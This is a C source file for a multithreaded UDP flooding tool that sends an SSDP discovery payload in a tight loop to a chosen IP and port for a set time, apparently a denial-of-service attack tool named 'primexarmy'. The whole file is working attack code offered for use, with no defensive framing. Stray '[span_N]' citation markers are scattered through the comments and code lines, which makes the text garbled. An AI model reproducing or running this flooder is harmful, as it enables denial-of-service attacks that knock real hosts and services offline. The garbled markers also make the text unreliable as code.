#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>

[span_1](start_span)// SSDP Payload strings extracted from source[span_1](end_span)
#define SSDP_PAYLOAD "M-SEARCH * HTTP/1.1\r\nHOST: 255.255.255.255:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\nST: urn:dial-multiscreen-org:service:dial:1\r\nUSER-AGENT: Google Chrome/60.0.3112.90 Windows\r\n\r\n"

struct target_info {
    char *ip;
    int port;
    int duration;
};

[span_2](start_span)// Attack function using symbols like sendto, socket, and htons[span_2](end_span)
void *attack(void *arg) {
    struct target_info *data = (struct target_info *)arg;
    int sock;
    struct sockaddr_in target_addr;
    [span_3](start_span)time_t end_time = time(NULL) + data->duration;[span_3](end_span)

    [span_4](start_span)sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);[span_4](end_span)
    if (sock < 0) {
        [span_5](start_span)perror("socket");[span_5](end_span)
        [span_6](start_span)pthread_exit(NULL);[span_6](end_span)
    }

    [span_7](start_span)memset(&target_addr, 0, sizeof(target_addr));[span_7](end_span)
    target_addr.sin_family = AF_INET;
    [span_8](start_span)target_addr.sin_port = htons(data->port);[span_8](end_span)
    [span_9](start_span)target_addr.sin_addr.s_addr = inet_addr(data->ip);[span_9](end_span)

    // Flooding loop logic
    while (time(NULL) < end_time) {
        [span_10](start_span)sendto(sock, SSDP_PAYLOAD, strlen(SSDP_PAYLOAD), 0, (struct sockaddr *)&target_addr, sizeof(target_addr));[span_10](end_span)
    }

    [span_11](start_span)close(sock);[span_11](end_span)
    [span_12](start_span)pthread_exit(NULL);[span_12](end_span)
}

int main(int argc, char *argv[]) {
    [span_13](start_span)// Usage format from source: ./adarsh ip port time threads[span_13](end_span)
    if (argc != 5) {
        [span_14](start_span)printf("Usage: ./primexarmy ip port time threads\n");[span_14](end_span)
        return 1;
    }

    char *ip = argv[1];
    [span_15](start_span)int port = atoi(argv[2]);[span_15](end_span)
    [span_16](start_span)int duration = atoi(argv[3]);[span_16](end_span)
    [span_17](start_span)int threads = atoi(argv[4]);[span_17](end_span)

    [span_18](start_span)// Status message from source[span_18](end_span)
    printf("Flooding %s:%d for %d seconds with %d threads...\n", ip, port, duration, threads);

    pthread_t tid[threads];
    struct target_info t_data = {ip, port, duration};

    for (int i = 0; i < threads; i++) {
        [span_19](start_span)// Thread creation using pthread_create[span_19](end_span)
        if (pthread_create(&tid[i], NULL, attack, (void *)&t_data) != 0) {
            [span_20](start_span)printf("Thread creation failed.\n");[span_20](end_span)
            return 1;
        }
    }

    for (int i = 0; i < threads; i++) {
        [span_21](start_span)pthread_join(tid[i], NULL);[span_21](end_span)
    }

    [span_22](start_span)printf("Finished.\n");[span_22](end_span)
    return 0;
}
